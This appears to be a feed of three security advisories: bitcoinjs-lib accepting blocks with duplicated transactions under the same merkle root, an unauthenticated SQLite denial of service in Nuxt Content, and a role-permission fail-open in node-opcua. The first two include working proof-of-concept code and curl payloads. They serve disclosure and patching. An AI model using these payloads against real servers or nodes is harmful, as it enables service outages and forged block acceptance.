items.title: [bitcoinjs-lib] bitcoinjs-lib: Undetected merkle node duplication in block root computation validates a forged transaction list
items.summary: SummaryfastMerkleRoot pads an odd level by hashing the last node with itself. It does not report that it did so, and checkTxRoots never looks for repeated transactions. A peer can therefore duplicate transactions to fill the pad and produce a block with a different transaction list but the same merkle root. The block hash and block id do not change, so the header still carries valid proof of work. In the proof of concept a real mainnet block goes from nine transactions to ten, and separately to twelve, with the same id every time, and checkTxRoots accepts all three. Bitcoin Core rejects this case through the mutated flag in ComputeMerkleRoot and the bad-txns-duplicate reason in CheckBlock. This is CVE-2012-2459.DetailsA bitcoin merkle tree pads an odd level by hashing the last node with itself. Duplicating transactions to fill that pad therefore yields the same root for a different transaction list. This is CVE-2012-2459. Bitcoin Core detects it in ComputeMerkleRoot, which scans each level for two adjacent equal hashes before padding and raises a mutated flag when it finds a pair, and CheckBlock then rejects the block with bad-txns-duplicate.uint256 ComputeMerkleRoot(std::vector<uint256> hashes, bool* mutated) {    bool mutation = false;    while (hashes.size() > 1) {        if (mutated) {            for (size_t pos = 0; pos + 1 < hashes.size(); pos += 2) {                if (hashes[pos] == hashes[pos + 1]) mutation = true;            }        }        if (hashes.size() & 1) {            hashes.push_back(hashes.back());        }        ...The forged block carries the duplicate in its own transaction list, so the pair is present at a level and the flag is raised. The honest block has no such pair and is unaffected.fastMerkleRoot performs the duplication and reports nothing.while (length > 1) {  let j = 0;  for (let i = 0; i < length; i += 2, ++j) {    const left = results[i];    const right = i + 1 === length ? left : results[i + 1];    const data = tools.concat([left, right]);    results[j] = digestFn(data);  }  length = j;}return results[0];Block.calculateMerkleRoot returns that value unchanged, and __checkMerkleRoot only compares it to the header field.private __checkMerkleRoot(): boolean {  if (!this.transactions) throw errorMerkleNoTxes;  const actualMerkleRoot = Block.calculateMerkleRoot(this.transactions);  return tools.compare(this.merkleRoot!, actualMerkleRoot) === 0;}Nothing anywhere in ts_src looks for an adjacent duplicate pair or for a repeated txid. checkTxRoots is the library's advertised block integrity gate and it inherits the gap.PoCimport { createRequire } from 'module';const require = createRequire(import.meta.url);import { Block } from 'bitcoinjs-lib/src/block';const fs = require('fs');const hex = (u) => Buffer.from(u).toString('hex');// Real mainnet block, from the Bitcoin Core vector set shipped in this repo.const f = JSON.parse(fs.readFileSync(  'test/fixtures/core/blocks.json', 'utf8'))[0];const honest = Block.fromHex(f.hex);console.log('honest block id       :', honest.getId());console.log('id matches fixture    :', honest.getId() === f.id);console.log('transactions          :', honest.transactions.length);console.log('merkle root           :', hex(honest.merkleRoot));console.log('checkTxRoots()        :', honest.checkTxRoots());console.log('serialized bytes      :', honest.toBuffer().length);// Attacker duplicates the last transaction and relays the result.const forged = Block.fromHex(f.hex);forged.transactions = forged.transactions.concat([  forged.transactions[forged.transactions.length - 1],]);// Round trip through the real parser, exactly as a P2P block message arrives.const parsed = Block.fromHex(forged.toHex());console.log('');console.log('forged block id       :', parsed.getId());console.log('transactions          :', parsed.transactions.length);console.log('merkle root           :', hex(parsed.merkleRoot));console.log('recomputed merkle root:', hex(Block.calculateMerkleRoot(parsed.transactions)));console.log('checkTxRoots()        :', parsed.checkTxRoots());console.log('serialized bytes      :', parsed.toBuffer().length);const ids = parsed.transactions.map((t) => t.getId());console.log('');console.log('same block id                 :', honest.getId() === parsed.getId());console.log('different serialized bytes    :', honest.toHex() !== parsed.toHex());console.log('different transaction lists   :', honest.transactions.length !== parsed.transactions.length);console.log('duplicate txid inside forged  :', new Set(ids).size !== ids.length);console.log('both accepted by checkTxRoots :', honest.checkTxRoots() && parsed.checkTxRoots());Output on bitcoinjs-lib v7.0.1:honest block id       : 0000000000013b8ab2cd513b0261a14096412195a72a0c4827d229dcc7e0f7afid matches fixture    : truetransactions          : 9merkle root           : 5275289558f51c9966699404ae2294730c3c9f9bda53523ce50e9b95e558da2fcheckTxRoots()        : trueserialized bytes      : 3054forged block id       : 0000000000013

items.title: [@nuxt/content] Nuxt Content: Unauthenticated SQLite Function DoS via Content Query API
items.summary: SummaryThe POST /__nuxt_content/:collection/query endpoint in @nuxt/content accepts an attacker-controlled sql field from the HTTP request body and executes it against a local SQLite database after passing it through an insufficient validator (assertSafeQuery). The validator only blocks a small set of SQL command keywords and does not reject expensive SQLite built-in functions such as randomblob(), zeroblob(), hex(), or length(). An unauthenticated remote attacker can craft a single request that forces SQLite to allocate hundreds of megabytes of memory and perform CPU-intensive work, causing server-wide denial of service. This endpoint is enabled by default for every collection and requires no authentication.DetailsThe vulnerability spans three source files:Route registration — src/module.ts:207-208The Nuxt Content module registers a public HTTP POST handler for each configured collection at startup:// src/module.ts:207-208addServerHandler({  route: `/__nuxt_content/${collection.name}/query`,  handler: resolver.resolve('./runtime/api/query.post'),})No authentication middleware is attached; the route is reachable by any client.Source (attacker input) — src/runtime/api/query.post.ts:7-9// src/runtime/api/query.post.tsconst { sql } = await readBody(event)          // line 8  — attacker-controlledassertSafeQuery(sql, collection)               // line 11 — insufficient validationreturn loadDatabaseAdapter(conf).all(sql)      // line 18 — raw sql passed to sinkInadequate sanitizer — src/runtime/internal/security.ts:55-63if (where) {  const noString = cleanupQuery(where, { removeString: true })  if (noString.match(SQL_COMMANDS)) {          // /SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|\$/i    throw new Error('Invalid query: WHERE clause contains unsafe SQL commands')  }  // No rejection of function calls (randomblob, zeroblob, hex, length, …)}The denylist matches only six DDL/DML keywords. SQLite resource-consumption functions (randomblob, zeroblob, hex, length) are not keywords matched by the regex and therefore pass validation unconditionally.Sink — src/runtime/internal/database.server.ts:26-28all: async (sql, params = []) => {  return db.prepare(sql).all(...params)        // executes the unmodified attacker sql}better-sqlite3's prepare().all() is a synchronous call that blocks the Node.js event loop for the entire duration of the SQLite query. A single malicious request therefore stalls all concurrent request handling.Attack chain summary:Attacker HTTP POST (sql field)  → query.post.ts readBody()          [source]  → assertSafeQuery() — BYPASS        [insufficient validation]  → loadDatabaseAdapter().all(sql)    [propagation]  → db.prepare(sql).all()             [sink — synchronous, blocks event loop]PoCEnvironment setupgit clone https://github.com/nuxt/content.gitcd contentgit checkout d8fed0c3ddbcad5805772e1ef8da9fbe841e772epnpm installpnpm dev:preparecd test/fixtures/basicpnpm dev --host 127.0.0.1 --port 3000Step 1 — Establish baseline (safe query)curl -sS -o /dev/null -w 'status=%{http_code} time=%{time_total}\n' \  -X POST 'http://127.0.0.1:3000/__nuxt_content/content/query' \  -H 'content-type: application/json' \  --data '{"sql":"SELECT * FROM _content_content WHERE (id = '"'"'1'"'"') ORDER BY stem ASC LIMIT 1"}'# Expected: status=200 time=~0.009sStep 2 — Attack payload (randomblob variant)curl -sS -o /dev/null -w 'status=%{http_code} time=%{time_total}\n' \  -X POST 'http://127.0.0.1:3000/__nuxt_content/content/query' \  -H 'content-type: application/json' \  --data '{"sql":"SELECT * FROM _content_content WHERE (length(hex(randomblob(200000000))) > 0) ORDER BY stem ASC LIMIT 1"}'# Expected: status=200  time=~2.25s  (~598 MB RSS during execution)The payload passes assertSafeQuery() because the WHERE clause contains no blocked keywords. SQLite then:Allocates 200 MB of random bytes via randomblob(200000000)Hex-encodes the result to a 400 MB ASCII string via hex()Computes the string length via length()Step 3 — Zeroblob variant (allocation-focused)--data '{"sql":"SELECT * FROM _content_content WHERE (zeroblob(1000000000) IS NOT NULL) ORDER BY stem ASC LIMIT 1"}'# 1 GB allocation; may trigger OOM terminationAutomated PoC (Docker)# Build and run the reproduction containerdocker build -f vuln-001/Dockerfile -t vuln001:latest \  reports/github_web_211_nuxt__contentdocker run -d -p 3000:3000 --name vuln001-container vuln001:latest# Run the PoC script (requires Python 3, no third-party packages)python3 vuln-001/poc.py --host 127.0.0.1 --port 3000Dynamic reproduction result (phase2):MetricValueBaseline response time0.0088 sAttack response time11.82 sSlowdown ratio1339×HTTP status for attack200 (not rejected)The Node.js event loop was blocked for the full duration of each attack request, confirmed by zero concurrent request throughput during the attack.Proposed patch — src/runtime/internal/security.ts const SQL_COMMANDS = /SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|\$/i+const SQL_WHERE_ALLOWED_TOKENS = new Set(['AND', 'OR'

items.title: [node-opcua-address-space] node-opcua: Namespace-Level RBAC Fail-Open - Anonymous Write/Call Bypass via Unbound `DefaultRolePermissions
items.summary: SummaryAn unauthenticated (Anonymous) client can Write protected Variables and Call privileged Methods on any Node that lacks explicit per-node permissions.This follows the inheritance model defined by OPC UA Part 3, §5.2.9, where nodes without an explicit RolePermissions attribute inherit the namespace DefaultRolePermissions. OPC 10000-3 §4.8.3 mandates a default-deny evaluation (Bad_UserAccessDenied when the operation bits are not set); node-opcua instead grants all permissions.The root cause is a combination of an authorization fail-open and a disconnect between the configuration API and the runtime enforcement path.Affected configurationThis advisory covers two cases that are not equally severe:No RolePermissions declared anywhere - resolution is permissive. This is node-opcua's documented behaviour for a server with no access control configured, so nothing is being bypassed. Worth fixing as an insecure default (CWE-1188), but it is not the 9.1 bypass. Stock Opc.Ua.NodeSet2.xml ships DefaultRolePermissions with no Value, so a server that declared no policy is NOT exposed.A policy is declared and silently ignored - setDefaultRolePermissions() succeeds and does nothing, so an operator who believes they locked the namespace down has not. This is the real bypass and this is what earns CVSS 9.1. It requires that someone declared a namespace default.Everything below describes case 2 unless stated otherwise.Root Cause AnalysisBug 1 - getPermissionForRole(null) returns allPermissions (violates §4.8.3 default-deny)File: packages/node-opcua-address-space/source/session_context.ts:151-153function getPermissionForRole(rolePermissions: RolePermissionType[] | null, role: NodeId): PermissionFlag {    if (rolePermissions === null) {        return allPermissions; // null means "grant everything" to ANY role, including Anonymous    }When the applicable policy resolves to null, the function returns allPermissions (Read, Write, Call) to whichever role is checking permissions, including Anonymous. OPC 10000-3 §4.8.3 requires the opposite: "If they are not set the Server returns Bad_UserAccessDenied."Bug 2 - The namespace default resolves to null on the enforcement pathThe runtime enforcement reads the DefaultRolePermissions / DefaultUserRolePermissions Variable nodes under Server/Namespaces/<ns>. These resolve to null in every reachable configuration:NodeSet2-loaded namespaces (DI / ADI / vendor) ship the Property without a Value (null).Programmatically-created namespaces have no NamespaceMetadata node under Server/Namespaces, so the lookup returns null.Additionally, server_engine.ts:947-957 rewrites these nodes to a Null-typed value on every initialize(), with no restore:for (const ns of namespacesNode.getComponents()) {    const defaultRolePermissions = ns.getChildByName("DefaultRolePermissions") as UAVariable | null;    if (defaultRolePermissions) {        defaultRolePermissions.setValueFromSource({ dataType: DataType.Null });    }}Note: the loaded value is already null in stock nodesets, so this reset only changes the value's dataType tag; it is not the sole cause, the namespace default is null regardless.Bug 3 - Two incoherent enforcement pathsThere are two separate and disconnected paths to resolve namespace-default permissions.Path A (private field) - Namespace.setDefaultRolePermissions() writes the policy exclusively to a JavaScript private field in namespace_impl.ts:public setDefaultRolePermissions(rolePermissions: RolePermissionTypeOptions[] | null): void {    this.defaultRolePermissions = rolePermissions ? coerceRolePermissions(rolePermissions) : undefined;}This is the value read by local getters (e.g. BaseNodeImpl.getRolePermissions(inherited=true)).Path B (UAVariable node) - the runtime access-control enforcement (Read/Write/Call) queries the DefaultRolePermissions UAVariable node instead of the private field (session_context.ts):const defaultRolePermissions = uaNamespaceObject.getChildByName("DefaultRolePermissions") as UAVariable;if (defaultRolePermissions) {    const dataValue = defaultRolePermissions.readValue();    if (dataValue?.statusCode.isGood()) {        return dataValue.value.value as RolePermissionType[] | null;    }}Because Path B reads the variable node and Path A writes the private field, the two are disconnected. The enforcement path resolves the namespace default to null,  the metadata node is absent (programmatic namespace) or Null-valued (nodeset namespace)  and the operator's setDefaultRolePermissions() field is never consulted. That null then triggers the fail-open (Bug 1).Measured: with setDefaultRolePermissions([Operator]) applied, namespace.getDefaultRolePermissions() returns the policy while getApplicableRolePermissions() returns null.Synchronization between the two paths only happens if the operator calls setNamespaceMetaData(), which binds the field to the node via bindVariable():metaData.defaultRolePermissions?.bindVariable(    {        get: () =>            new Variant({
